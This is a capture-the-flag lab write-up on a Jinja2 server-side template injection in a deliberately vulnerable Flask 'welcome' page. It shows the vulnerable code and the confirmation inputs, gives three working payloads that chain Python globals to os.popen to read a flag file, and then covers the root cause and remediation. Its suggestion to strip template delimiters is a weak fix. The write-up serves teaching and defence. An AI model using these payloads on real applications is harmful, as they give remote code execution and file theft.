# Challenge 07 — Welcome Card (Server-Side Template Injection — SSTI)

## Challenge Overview

### Description

The welcome page displays a personalized greeting using the `name` URL parameter. User input is concatenated directly into a Jinja2 template string and rendered server-side via `render_template_string()`.

### Goal

Execute arbitrary Python code via SSTI to read `/app/data/flag_ssti.txt` and retrieve the flag.

### Hint

> "If the page is willing to repeat you, find out whether it understands you too."

The hint indicates the server interprets input as template code rather than just reflecting it.

---

## Vulnerability

- **Class:** Server-Side Template Injection (SSTI) — Jinja2
- **Location:** `main.py`, `/welcome` route
- **Cause:** User input (`name`) concatenated into a template string passed to `render_template_string()`

```python
@app.route('/welcome')
def welcome():
    name = request.args.get('name', 'Customer')
    template = (
        "{% extends 'base.html' %}"
        # ...
        "<p class='lead mt-3'>Hello, <strong>" + name + "</strong>! ...</p>"
        # ...
    )
    return render_template_string(template)
```

`render_template_string()` evaluates the entire string as a Jinja2 template. Any `{{...}}` expressions in user input execute as Python code.

---

## Testing & Confirmation

| Input | Output | Result |
|-------|--------|--------|
| `John` | `Hello, John!` | Normal reflection |
| `{{7*7}}` | `Hello, 49!` | Template evaluated — SSTI confirmed |
| `{{config}}` | `Hello, <Config {...}>` | Flask config object exposed |

---

## Exploitation

### Payloads

**Via `config` object chain:**
```
{{config.__class__.__init__.__globals__['os'].popen('cat /app/data/flag_ssti.txt').read()}}
```

**Via `lipsum` global:**
```
{{lipsum.__globals__['os'].popen('cat /app/data/flag_ssti.txt').read()}}
```

**Via `request` object:**
```
{{request.application.__globals__['os'].popen('cat /app/data/flag_ssti.txt').read()}}
```

### Full URL (URL-encoded)
```
/welcome?name={{config.__class__.__init__.__globals__['os'].popen('cat /app/data/flag_ssti.txt').read()}}
```

### Why It Works

- `render_template_string()` treats the concatenated string as a template
- `{{...}}` is Jinja2's expression syntax — contents evaluate as Python
- Object chain: `config` → `__class__` → `__init__` → `__globals__` → `os` → `popen` → `read()`
- `lipsum` and `request` are Jinja2 built-in globals with access to `__globals__`

### Expected Output

The page displays:
```
Hello, FLAG{ssti_<8-char-hex>}!
```

The flag appears inline in the welcome message.

---

## Flag Retrieval

1. Navigate to:
   ```
   http://localhost:3000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('cat /app/data/flag_ssti.txt').read()}}
   ```
2. The flag appears in the welcome message body.

---

## Root Cause

Concatenating user input into a template string and using `render_template_string()` instead of `render_template()`. The former makes user input part of the template itself.

---

## Remediation

- **Never concatenate user input into templates.** Pass data as template variables:

```python
return render_template('welcome.html', name=name)
```

```html
<p>Hello, <strong>{{ name }}</strong>!</p>
```

- If `render_template_string()` is required, strip `{{` and `{%` from input before concatenation.
- Apply least privilege — the web process should not have unnecessary file read access.

---

## Key Takeaways

- **Vulnerability:** SSTI in Jinja2 via `render_template_string()`
- **Exploitation:** Inject `{{...}}` expressions; chain Python object access for RCE
- **Lesson:** Templates and user input must stay separated. Pass data as variables, never concatenate into template strings.
